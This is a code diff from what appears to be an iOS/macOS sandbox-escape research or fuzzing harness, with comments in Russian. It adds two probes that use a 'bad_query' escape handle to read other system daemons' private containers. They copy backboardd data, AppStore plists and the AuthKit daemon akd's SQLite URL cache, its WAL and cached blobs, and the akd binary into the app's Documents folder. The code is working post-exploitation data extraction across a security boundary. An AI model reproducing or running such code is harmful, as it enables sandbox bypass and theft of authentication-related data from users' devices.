@@ -47041,6 +47041,311 @@ static void p_bq108(void) {
     fsync(fileno(stderr));
 }
 
+// p_bq109 — v269: ВЫТАСКИВАЕМ живые файлы контейнеров Tier-A на Mac (§262-next).
+// functions.data (5.5MB, backboardd) — кастомный бинарный формат, reader при
+// старте демона (§260). Читаем хвост/голову (hex в лог) + копируем целиком
+// в Documents. Наш uid=501 == uid файлов → чтение через escape-хэндл.
+static void p_bq109(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq109] v269: извлечение живых файлов контейнеров (§262)");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq109] escape FAIL"); return; }
+
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+
+    // [контейнер-uuid, имя, человекочитаемый тег]
+    static const struct { const char *uuid; const char *rel; const char *tag; } files[] = {
+        { "867912A4-A70D-428C-9551-D28453B6F1B4", "Library/Caches/functions.data", "bb-funcdata" },
+        { "867912A4-A70D-428C-9551-D28453B6F1B4", "Library/Caches/functions.list", "bb-funclist" },
+        { "AF589EEA-A5CE-42E9-B955-96B9234C5A85",
+          "Library/Caches/OpenOperationStaging.sb-8bcc6f9c-a3P4O8", "lsd-staging1" },
+        { "AF589EEA-A5CE-42E9-B955-96B9234C5A85", "Library/Caches/OpenOperationStaging", "lsd-staging2" },
+        { "3E27999E-F441-4625-A423-AF11E87F71E8", "Library/apps.plist", "as-apps" },
+        { "3E27999E-F441-4625-A423-AF11E87F71E8",
+          "Library/katana-subscription-cache.plist", "as-katana" },
+        { "D751CF7C-BB34-4A31-9D9A-D8DA5EBF4DEB",
+          "Library/Caches/com.apple.PaperBoardUI", "sb-paperboard" },
+    };
+
+    for (unsigned i = 0; i < sizeof(files)/sizeof(files[0]); i++) {
+        char src[1100];
+        snprintf(src, sizeof(src), "/var/containers/Data/System/%s/%s",
+                 files[i].uuid, files[i].rel);
+        struct stat st = {0};
+        if (stat(src, &st) != 0) {
+            LOG("[bq109] %-30s %s: stat errno %d", files[i].tag, files[i].rel, errno);
+            continue;
+        }
+        if (S_ISDIR(st.st_mode)) {
+            LOG("[bq109] %-30s %s: ДИРЕКТОРИЯ (не файл) — листаем:", files[i].tag, files[i].rel);
+            DIR *dd = opendir(src);
+            if (dd) {
+                struct dirent *de; int c = 0;
+                while ((de = readdir(dd)) && c < 20) {
+                    if (de->d_name[0] == '.') continue;
+                    c++;
+                    LOG("[bq109]   /%s", de->d_name);
+                }
+                closedir(dd);
+            }
+            continue;
+        }
+        LOG("[bq109] %-30s %s: %lld байт", files[i].tag, files[i].rel,
+            (long long)st.st_size);
+        fsync(fileno(stderr));
+
+        FILE *f = fopen(src, "rb");
+        if (!f) { LOG("[bq109]   fopen FAIL errno %d", errno); continue; }
+
+        // hex head 64 байта
+        unsigned char head[64];
+        size_t hr = fread(head, 1, sizeof(head), f);
+        LOG("[bq109]   head[%zu]:", hr);
+        for (size_t r = 0; r < hr; r += 16) {
+            char line[200]; int off = 0;
+            off += snprintf(line+off, sizeof(line)-off, "  %04zx  ", r);
+            for (size_t b = r; b < r+16 && b < hr; b++)
+                off += snprintf(line+off, sizeof(line)-off, "%02x ", head[b]);
+            off += snprintf(line+off, sizeof(line)-off, " |");
+            for (size_t b = r; b < r+16 && b < hr; b++)
+                off += snprintf(line+off, sizeof(line)-off, "%c",
+                                head[b] >= 0x20 && head[b] < 0x7f ? head[b] : '.');
+            snprintf(line+off, sizeof(line)-off, "|");
+            LOG("[bq109]%s", line);
+        }
+        fsync(fileno(stderr));
+
+        // копия целиком
+        char out[600];
+        snprintf(out, sizeof(out), "%s/%s", docs.fileSystemRepresentation, files[i].tag);
+        FILE *o = fopen(out, "wb");
+        if (o) {
+            char buf[65536]; ssize_t r; unsigned long tot = 0;
+            fseek(f, 0, SEEK_SET);
+            while ((r = fread(buf, 1, sizeof(buf), f)) > 0) {
+                fwrite(buf, 1, (size_t)r, o); tot += (unsigned long)r;
+            }
+            fclose(o);
+            LOG("[bq109]   copied %lu -> %s (%s)", tot, files[i].tag,
+                tot == (unsigned long)st.st_size ? "OK" : "MISMATCH");
+        } else {
+            LOG("[bq109]   out fopen FAIL errno %d", errno);
+        }
+        fclose(f);
+        fsync(fileno(stderr));
+    }
+    bad_query_release(h);
+    LOG("[bq109] ИТОГ: извлечение завершено");
+    fsync(fileno(stderr));
+}
+
+// p_bq110 — v270: akd (root, CFURLCache жив!) + PaperBoardUI + Metal-cache контекст (§263-next).
+// akd: Caches/Cache.db 48KB + wal 1295KB — ДЕМОН АКТИВНО ПОЛЬЗУЕТСЯ SQLite-кэшем.
+// CFURLCache = SQLite + CFNetwork blob-кэш (fsCachedData/) — кастомные C-парсеры.
+// Также: (1) akd бинарь из AuthKit.framework/Support (System читается!),
+// (2) launchd-job akd (uid/sbx), (3) PaperBoardUI mapped-image-cache листинг,
+// (4) functions.list остаток структуры (записи после первой).
+static void p_bq110(void) {
+    const char *grp = getenv("FUZZ_BQ_GROUP") ?: "group.9e66ab897d52ea95.1";
+    LOG("[bq110] v270: akd CFURLCache + PaperBoardUI + Metal-cache (§263)");
+    fsync(fileno(stderr));
+    int64_t h = bad_query((char *)"/var/containers/Data/System", 0, (char *)grp, 0);
+    if (h < 0) { LOG("[bq110] escape FAIL"); return; }
+    NSString *docs = NSSearchPathForDirectoriesInDomains(
+        NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
+
+    // === 1. akd контейнер: Cache.db + wal + shm + fsCachedData ===
+    {
+        static const char *akd_files[] = {
+            "E8F726E1-00B6-4703-91D1-49267FC0F979/Library/Caches/Cache.db",
+            "E8F726E1-00B6-4703-91D1-49267FC0F979/Library/Caches/Cache.db-wal",
+            "E8F726E1-00B6-4703-91D1-49267FC0F979/Library/Caches/Cache.db-shm",
+        };
+        static const char *tags[] = { "akd-Cache.db", "akd-Cache.db-wal", "akd-Cache.db-shm" };
+        for (unsigned i = 0; i < 3; i++) {
+            char src[1100];
+            snprintf(src, sizeof(src), "/var/containers/Data/System/%s", akd_files[i]);
+            struct stat st = {0};
+            if (stat(src, &st) != 0) { LOG("[bq110] %s: stat errno %d", tags[i], errno); continue; }
+            LOG("[bq110] %s: %lld байт, uid=%d mode=%o mtime=%ld", tags[i],
+                (long long)st.st_size, st.st_uid, st.st_mode, (long)st.st_mtime);
+            FILE *f = fopen(src, "rb");
+            if (!f) { LOG("[bq110]   fopen errno %d", errno); continue; }
+            char out[600];
+            snprintf(out, sizeof(out), "%s/%s", docs.fileSystemRepresentation, tags[i]);
+            FILE *o = fopen(out, "wb");
+            unsigned long tot = 0;
+            if (o) { char buf[65536]; size_t r;
+                while ((r = fread(buf, 1, sizeof(buf), f)) > 0) { fwrite(buf, 1, r, o); tot += r; }
+                fclose(o);
+                LOG("[bq110]   copied %lu (%s)", tot,
+                    tot == (unsigned long)st.st_size ? "OK" : "MISMATCH");
+            } else LOG("[bq110]   out FAIL errno %d", errno);
+            fclose(f);
+            fsync(fileno(stderr));
+        }
+        // fsCachedData листинг + первые 3 блоба
+        char fsd[1100];
+        snprintf(fsd, sizeof(fsd),
+                 "/var/containers/Data/System/E8F726E1-00B6-4703-91D1-49267FC0F979"
+                 "/Library/Caches/fsCachedData");
+        DIR *dd = opendir(fsd);
+        if (dd) {
+            struct dirent *de; int c = 0;
+            while ((de = readdir(dd)) && c < 30) {
+                if (de->d_name[0] == '.') continue;
+                c++;
+                char fp[1300];
+                snprintf(fp, sizeof(fp), "%s/%s", fsd, de->d_name);
+                struct stat st = {0};
+                if (stat(fp, &st) == 0) {
+                    LOG("[bq110] fsCachedData/%s: %lld байт uid=%d", de->d_name,
+                        (long long)st.st_size, st.st_uid);
+                    if (c <= 3 && st.st_size > 0 && st.st_size < 200000) {
+                        FILE *f = fopen(fp, "rb");
+                        if (f) {
+                            char out[700];
+                            snprintf(out, sizeof(out), "%s/akd-blob%d", docs.fileSystemRepresentation, c);
+                            FILE *o = fopen(out, "wb");
+                            if (o) { char buf[65536]; size_t r; unsigned long t2 = 0;
+                                while ((r = fread(buf, 1, sizeof(buf), f)) > 0) { fwrite(buf,1,r,o); t2 += r; }
+                                fclose(o);
+                                LOG("[bq110]   blob copied %lu -> akd-blob%d", t2, c);
+                            }
+                            fclose(f);
+                        }
+                    }
+                }
+            }
+            closedir(dd);
+            LOG("[bq110] fsCachedData: %d записей", c);
+        } else LOG("[bq110] fsCachedData opendir errno %d", errno);
+        fsync(fileno(stderr));
+    }
+
+    // === 2. akd бинарь + launchd job ===
+    {
+        static const char *akd_paths[] = {
+            "/usr/libexec/akd",
+            "/System/Library/PrivateFrameworks/AuthKit.framework/Support/akd",
+            "/System/Library/PrivateFrameworks/AuthKit.framework/Resources/akd",
+            "/System/Library/PrivateFrameworks/AuthKit.framework/Resources/com.apple.akd.launchd.plist",
+            "/System/Library/PrivateFrameworks/AuthKit.framework/Resources/launchd.plist",
+        };
+        for (unsigned i = 0; i < sizeof(akd_paths)/sizeof(akd_paths[0]); i++) {
+            struct stat st = {0};
+            if (stat(akd_paths[i], &st) != 0) {
+                LOG("[bq110] akd[%u] %s: errno %d", i, akd_paths[i], errno);
+                continue;
+            }
+            LOG("[bq110] akd[%u] %s: %lld байт *** ЕСТЬ ***", i, akd_paths[i],
+                (long long)st.st_size);
+            if (st.st_size > 100000 && st.st_size < 20000000) {
+                FILE *f = fopen(akd_paths[i], "rb");
+                if (f) {
+                    char out[600];
+                    snprintf(out, sizeof(out), "%s/daemon-akd", docs.fileSystemRepresentation);
+                    FILE *o = fopen(out, "wb");
+                    if (o) { char buf[65536]; size_t r; unsigned long t2 = 0;
+                        while ((r = fread(buf, 1, sizeof(buf), f)) > 0) { fwrite(buf,1,r,o); t2 += r; }
+                        fclose(o);
+                        LOG("[bq110]   copied %lu -> daemon-akd", t2);
+                    }
+                    fclose(f);
+                }
+            } else if (st.st_size <= 100000) {
+                // launchd plist — печатаем целиком в лог
+                FILE *f = fopen(akd_paths[i], "rb");
+                if (f) {
+                    char pb[16384]; size_t r = fread(pb, 1, sizeof(pb)-1, f);
+                    fclose(f); pb[r] = 0;
+                    LOG("[bq110]   plist [%zu байт]:", r);
+                    char *save = NULL;
+                    for (char *line = strtok_r(pb, "\n", &save); line && strlen(line) < 400;
+                         line = strtok_r(NULL, "\n", &save))
+                        LOG("[bq110]     %s", line);
+                }
+            }
+            fsync(fileno(stderr));
+        }
+        // AuthKit.framework Resources opendir — ищем launchd/job plists
+        DIR *dd = opendir("/System/Library/PrivateFrameworks/AuthKit.framework/Resources");
+        if (dd) {
+            struct dirent *de; int c = 0;
+            while ((de = readdir(dd)) && c < 40) {
+                if (de->d_name[0] == '.') continue;
+                c++;
+                LOG("[bq110] AuthKit/Resources/%s", de->d_name);
+            }
+            closedir(dd);
+        } else LOG("[bq110] AuthKit/Resources opendir errno %d", errno);
+        dd = opendir("/System/Library/PrivateFrameworks/AuthKit.framework");
+        if (dd) {
+            struct dirent *de; int c = 0;
+            while ((de = readdir(dd)) && c < 40) {
+                if (de->d_name[0] == '.') continue;
+                c++;
+                LOG("[bq110] AuthKit/%s", de->d_name);
+            }
+            closedir(dd);
+        }
+        fsync(fileno(stderr));
+    }
+
+    // === 3. springboard PaperBoardUI mapped image cache ===
+    {
+        char pbc[1100];
+        snprintf(pbc, sizeof(pbc),
+                 "/var/containers/Data/System/D751CF7C-BB34-4A31-9D9A-D8DA5EBF4DEB"
+                 "/Library/Caches/com.apple.PaperBoardUI/PBUIMappedImageCacheManager-Default");
+        DIR *dd = opendir(pbc);
+        if (dd) {
+            struct dirent *de; int c = 0;
+            while ((de = readdir(dd)) && c < 30) {
+                if (de->d_name[0] == '.') continue;
+                c++;
+                char fp[1400];
+                snprintf(fp, sizeof(fp), "%s/%s", pbc, de->d_name);
+                struct stat st = {0};
+                if (stat(fp, &st) == 0)
+                    LOG("[bq110] PBUIMapped/%s: %lld байт uid=%d dir=%d", de->d_name,
+                        (long long)st.st_size, st.st_uid, S_ISDIR(st.st_mode));
+            }
+            closedir(dd);
+        } else LOG("[bq110] PBUIMapped opendir errno %d", errno);
+        fsync(fileno(stderr));
+    }
+
+    // === 4. functions.list — записи 2..8 (структура после первой) ===
+    {
+        char fl[1100];
+        snprintf(fl, sizeof(fl),
+                 "/var/containers/Data/System/867912A4-A70D-428C-9551-D28453B6F1B4"
+                 "/Library/Caches/functions.list");
+        FILE *f = fopen(fl, "rb");
+        if (f) {
+            unsigned char buf[520];
+            size_t r = fread(buf, 1, sizeof(buf), f);
+            fclose(f);
+            LOG("[bq110] functions.list первые %zu байт:", r);
+            for (size_t o = 0; o < r; o += 32) {
+                char line[300]; int off = 0;
+                off += snprintf(line+off, sizeof(line)-off, "  %04zx ", o);
+                for (size_t b = o; b < o+32 && b < r; b++)
+                    off += snprintf(line+off, sizeof(line)-off, "%02x", buf[b]);
+                LOG("[bq110]%s", line);
+            }
+            fsync(fileno(stderr));
+        }
+    }
+
+    bad_query_release(h);
+    LOG("[bq110] ИТОГ: akd+PaperBoardUI+Metal собраны");
+    fsync(fileno(stderr));
+}
+
 // p_bq87 — v246: SANDBOX-ЛАЗЕЙКИ — что 27.2 ЗАКРЫЛ, а b4 ещё открыт?
 // security_sandbox кекст: +133 правил в 27.2. Каждое новое правило =
 // что-то было РАЗРЕШЕНО в 27.0 (наш b4) и ЗАПРЕЩЕНО в 27.2.
@@ -55663,6 +55968,8 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_BQ106")) { p_bq106(); LOG("[probe13] bq106-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ107")) { p_bq107(); LOG("[probe13] bq107-only mode, stop"); return NULL; }
         if (getenv("FUZZ_BQ108")) { p_bq108(); LOG("[probe13] bq108-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ109")) { p_bq109(); LOG("[probe13] bq109-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_BQ110")) { p_bq110(); LOG("[probe13] bq110-only mode, stop"); return NULL; }
         if (getenv("FUZZ_XPCENUM")) { p_xpcenum(); LOG("[xpcen] xpcenum-only mode, stop"); return NULL; }
         if (getenv("FUZZ_ASTRIS")) { p_astris(); LOG("[probe13] astris-only mode, stop"); return NULL; }
         if (getenv("FUZZ_NETV6")) { p_netv6(); LOG("[probe13] netv6-only mode, stop"); return NULL; }
